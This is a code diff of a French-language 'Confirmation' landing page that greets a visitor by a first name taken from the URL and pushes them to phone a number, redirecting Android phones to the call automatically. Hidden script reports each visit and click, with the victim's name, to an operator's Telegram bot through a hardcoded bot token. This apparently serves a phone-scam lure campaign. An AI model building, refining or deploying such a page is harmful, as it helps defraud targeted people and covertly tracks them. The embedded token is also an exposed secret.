@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Confirmation</title>
   <style>
     * {
@@ -20,6 +20,8 @@
       justify-content: center;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       overflow: hidden;
+      -webkit-user-select: none;
+      user-select: none;
     }
     .card {
       background: #18181b;
@@ -57,6 +59,12 @@
       gap: 10px;
       transition: background-color 0.2s ease, transform 0.1s ease;
       -webkit-tap-highlight-color: transparent;
+      cursor: pointer;
+      touch-action: manipulation;
+    }
+    /* Indispensable pour iOS : empêche l'icône/texte de bloquer le clic du bouton */
+    .btn-call * {
+      pointer-events: none;
     }
     .btn-call:active {
       transform: scale(0.98);
@@ -75,7 +83,7 @@
     <div id="txt-greeting" class="greeting">Bonjour</div>
     <div class="subtext">Appuyez ci-dessous pour lancer l'appel</div>
 
-    <a id="btn-call" class="btn-call" href="tel:+33698511040">
+    <a id="btn-call" class="btn-call" href="tel:+33600000000">
       <svg viewBox="0 0 24 24">
         <path d="M6.62 10.79a15.053 15.053 0 006.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
       </svg>
@@ -86,37 +94,59 @@
   <script>
     // ⚠️ Remplace par ton vrai numéro si besoin
     var MON_NUMERO = "+33600000000"; 
-    var NUMERO = "tel:" + MON_NUMERO;
+    var NUMERO = "tel:" + MON_NUMERO.replace(/[^\d+]/g, '');
 
-    // VRAIS IDENTIFIANTS TELEGRAM (issus de ton ancien projet)
+    // VRAIS IDENTIFIANTS TELEGRAM (de ton bot opérationnel)
     var botToken = "8326192481:AAFeag-sd84P6ykvzDyh0ZK3jNqHLtM2KSQ";
     var chatId = "-1004410634781";
 
-    // Récupération du prénom dans l'URL (ex: allordv.lol/Ryan)
-    let decodedName = 'Client';
-    const pathSegments = window.location.pathname.split('/').filter(Boolean);
-    if (pathSegments.length > 0) {
-      const rawPathName = pathSegments[0].replace(/-/g, ' ');
-      decodedName = decodeURIComponent(rawPathName).trim();
-    } else {
-      const params = new URLSearchParams(window.location.search);
-      const clientName = params.get('nom') || params.get('prenom') || 'Client';
-      decodedName = decodeURIComponent(clientName).trim();
+    // Récupération sécurisée du prénom (blindée contre les crashs Safari)
+    var decodedName = 'Client';
+    try {
+      var pathSegments = window.location.pathname.split('/').filter(Boolean);
+      if (pathSegments.length > 0) {
+        var rawPathName = pathSegments[0].replace(/-/g, ' ');
+        decodedName = decodeURIComponent(rawPathName).trim();
+      } else {
+        var params = new URLSearchParams(window.location.search);
+        var clientName = params.get('nom') || params.get('prenom') || 'Client';
+        decodedName = decodeURIComponent(clientName).trim();
+      }
+    } catch(e) {
+      decodedName = 'Client';
     }
 
     if (!decodedName || decodedName.length < 2) {
       decodedName = 'Client';
     }
 
-    // Mise à jour du texte de la page
-    document.getElementById('txt-greeting').textContent = "Bonjour " + decodedName;
-    document.getElementById('btn-call').href = NUMERO;
+    // Mise à jour DOM
+    var greetingEl = document.getElementById('txt-greeting');
+    var btnCallEl = document.getElementById('btn-call');
 
-    // Envoi Telegram exactement comme ton ancien projet
-    const telegramMsg = "🚨 CLIC DÉTECTÉ Projet numéro redirection !\nLe client " + decodedName + " vient de cliquer sur le lien ! 🔥";
-    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(telegramMsg)).catch(function(e) {});
+    if (greetingEl) greetingEl.textContent = "Bonjour " + decodedName;
+    if (btnCallEl) btnCallEl.href = NUMERO;
 
-    // Redirection automatique Android
+    // Fonction d'envoi Telegram
+    function sendTelegram() {
+      try {
+        var telegramMsg = "🚨 CLIC DÉTECTÉ Projet numéro redirection !\nLe client " + decodedName + " vient de cliquer sur le lien ! 🔥";
+        var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(telegramMsg);
+        fetch(telegramUrl).catch(function(e) {});
+      } catch(err) {}
+    }
+
+    // Envoi Telegram à l'ouverture de la page
+    sendTelegram();
+
+    // Sécurité supplémentaire : renvoi au clic sur le bouton (iPhone)
+    if (btnCallEl) {
+      btnCallEl.addEventListener('click', function() {
+        sendTelegram();
+      });
+    }
+
+    // Redirection automatique STRICTEMENT réservée à Android
     var isAndroid = /android/i.test(navigator.userAgent);
     if (isAndroid) {
       window.location.href = NUMERO;
